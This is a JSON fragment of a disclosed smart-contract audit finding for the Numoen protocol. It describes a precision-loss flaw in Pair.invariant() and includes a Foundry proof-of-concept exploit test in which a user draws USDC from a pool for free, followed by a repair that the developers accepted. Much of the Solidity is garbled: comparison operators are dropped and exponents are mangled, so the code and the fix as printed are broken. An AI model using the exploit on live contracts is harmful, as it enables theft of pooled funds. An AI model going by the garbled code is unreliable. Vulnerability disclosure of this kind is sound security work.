                    "//solidity\nPair.sol\n52:   /// @inheritdoc IPair\n53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss\n57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss\n58:\n59:     if (scale1  2 * upperBound) revert InvariantError();\n60:\n61:     uint256 a = scale0 * 1e18;\n62:     uint256 b = scale1 * upperBound;\n63:     uint256 c = (scale1 * scale1) / 4;\n64:     uint256 d = upperBound * upperBound;\n65:\n66:     return a + b = c + d;\n67:   }\n\n",
                    "//solidity\n  function testAttack() external\n  {\n    // token0 is USDC\n    token0Scale = 6;\n    token1Scale = 18;\n\n    // cuh adds liquidity\n    lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));\n\n    uint256 amount0 = 1.5*106;\n    uint256 amount1 = 2 * (5 * 1024 1021);\n    uint256 liquidity = 1024;\n\n    token0.mint(cuh, amount0);\n    token1.mint(cuh, amount1);\n\n    vm.startPrank(cuh);\n    token0.approve(address(liquidityManager), amount0);\n    token1.approve(address(liquidityManager), amount1);\n\n    liquidityManager.addLiquidity(\n      LiquidityManager.AddLiquidityParams({\n        token0: address(token0),\n        token1: address(token1),\n        token0Exp: token0Scale,\n        token1Exp: token1Scale,\n        upperBound: upperBound,\n        liquidity: liquidity,\n        amount0Min: amount0,\n        amount1Min: amount1,\n        sizeMin: 0,\n        recipient: cuh,\n        deadline: block.timestamp\n      })\n    );\n    vm.stopPrank();\n    showLendgineInfo();\n\n    // dennis starts with zero token\n    assertEq(token0.balanceOf(dennis), 0);\n\n    // dennis pulls 0.5 USDC free\n    lendgine.swap(\n      dennis,\n      5*105,\n      0,\n      abi.encode(\n        SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})\n      )\n    );\n\n    showLendgineInfo();\n\n    // assert\n    assertEq(token0.balanceOf(dennis), 5*105);\n  }\n"
                ],
                "Type": " Precision loss in the invariant function can lead to loss of funds",
                "Description": "*Submitted by hansfriese(https://github.com/code-423n4/2023-01-numoen-findings/issues/264)*\n\nsrc/core/Pair.sol#L56(https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56)<br\n\nAn attacker can steal the funds without affecting the invariant.\n\n\nWe can say the function Pair.invariant() is the heart of the protocol.<br\nAll the malicious trades should be prevented by this function.\n\nsolidity\nPair.sol\n52:   /// @inheritdoc IPair\n53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss\n57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss\n58:\n59:     if (scale1  2 * upperBound) revert InvariantError();\n60:\n61:     uint256 a = scale0 * 1e18;\n62:     uint256 b = scale1 * upperBound;\n63:     uint256 c = (scale1 * scale1) / 4;\n64:     uint256 d = upperBound * upperBound;\n65:\n66:     return a + b = c + d;\n67:   }\n\n\n\nThe problem is there is a precision loss in the L56 and L57.<br\nThe precision loss can result in the wrong invariant check result.<br\nLet's say the token0 has 6 decimals and liquidity has more than 24 decimals.<br\nThen the first FullMath.mulDiv will cause significant rounding before it's converted to D18.<br\nTo clarify the difference I wrote a custom function invariant() to see the actual value of a+b-c-d.\n\n      function invariant(uint256 amount0, uint256 amount1, uint256 liquidity, uint256 token0Scale, uint256 token1Scale) public view returns (uint256 res) {\n        if (liquidity == 0) {\n            require (amount0 == 0 && amount1 == 0);\n            return 0;\n        }\n\n        // uint256 scale0 = FullMath.mulDiv(amount0* token0Scale, 1e18, liquidity) ;\n        // uint256 scale1 = FullMath.mulDiv(amount1* token1Scale, 1e18, liquidity) ;\n        uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n        uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n        if (scale1  2 * upperBound) revert();\n\n        uint256 a = scale0 * 1e18;\n        uint256 b = scale1 * upperBound;\n        uint256 c = (scale1 * scale1) / 4;\n        uint256 d = upperBound * upperBound;\n\n        res = a + b c d;\n      }\n\n      function testAudit1() external\n      {\n        uint256 x = 1*106;\n        uint256 y = 2 * (5 * 1024 1021);\n        uint256 liquidity = 1024;\n        uint256 token0Scale=1012;\n        uint256 token1Scale=1;\n        emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n\n        x = 1.5*106;\n        emit log_named_decimal_uint(\"invariant\", invariant(x, y, liquidity, token0Scale, token1Scale), 36);\n      }\n\nPut these two functions in the LiquidityManagerTest.t.sol and run the case.<br\nThe result is as below and it shows that while the reserve0 amount changes to 150%, the actual value a+b-c-d does not change.\n\n    F:SOLCodeCode4rena2023-01-numoenforge test -vv --match-test testAudit1\n    \u2812] Compiling...\n    No files changed, compilation skipped\n\n    Running 1 test for test/LiquidityManagerTest.t.sol:LiquidityManagerTest\n    PASS] testAudit1() (gas: 10361)\n    Logs:\n      invariant: 0.000000000000000000000000000000000000\n      invariant: 0.000000000000000000000000000000000000\n\n    Test result: ok. 1 passed; 0 failed; finished in 5.74ms\n\nSo what does this mean? We know that if a+b-c-d is positive, it means anyone can call swap() to withdraw the excess value.<br\nThe above test shows that the significant change in the token0 reserve amount did not change the value a+b-c-d.<br\nBased on this, I wrote an attack case where dennis pulls 0.5&ast;10&ast;&ast;6 token0 without cost while the invariant stays at zero.<br\nAlthough the benefit is only 0.5 USDC for this test case, this shows a possibility drawing value without affecting the invariant for pools with low decimals.\n\nsolidity\n  function testAttack() external\n  {\n    // token0 is USDC\n    token0Scale = 6;\n    token1Scale = 18;\n\n    // cuh adds liquidity\n    lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));\n\n    uint256 amount0 = 1.5*106;\n    uint256 amount1 = 2 * (5 * 1024 1021);\n    uint256 liquidity = 1024;\n\n    token0.mint(cuh, amount0);\n    token1.mint(cuh, amount1);\n\n    vm.startPrank(cuh);\n    token0.approve(address(liquidityManager), amount0);\n    token1.approve(address(liquidityManager), amount1);\n\n    liquidityManager.addLiquidity(\n      LiquidityManager.AddLiquidityParams({\n        token0: address(token0),\n        token1: address(token1),\n        token0Exp: token0Scale,\n        token1Exp: token1Scale,\n        upperBound: upperBound,\n        liquidity: liquidity,\n        amount0Min: amount0,\n        amount1Min: amount1,\n        sizeMin: 0,\n        recipient: cuh,\n        deadline: block.timestamp\n      })\n    );\n    vm.stopPrank();\n    showLendgineInfo();\n\n    // dennis starts with zero token\n    assertEq(token0.balanceOf(dennis), 0);\n\n    // dennis pulls 0.5 USDC free\n    lendgine.swap(\n      dennis,\n      5*105,\n      0,\n      abi.encode(\n        SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})\n      )\n    );\n\n    showLendgineInfo();\n\n    // assert\n    assertEq(token0.balanceOf(dennis), 5*105);\n  }\n\n\n\nFoundry\n\n",
                "Repair": "\nMake sure to multiply first before division to prevent precision loss.\n\nsolidity\n  /// @inheritdoc IPair\n  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n\n    uint256 scale0 = FullMath.mulDiv(amount0 * token0Scale, 1e18, liquidity) ;//@audit-info change here\n    uint256 scale1 = FullMath.mulDiv(amount1 * token1Scale, 1e18, liquidity) ;//@audit-info change here\n\n    if (scale1  2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b = c + d;\n  }\n\n\n\nkyscott18 (Numoen) confirmed and commented(https://github.com/code-423n4/2023-01-numoen-findings/issues/264#issuecomment-1423005106):\n  We agree with the issue and implemented the same fix.\n\n\n\n*\n \n\n"
            }
        ]
    }
]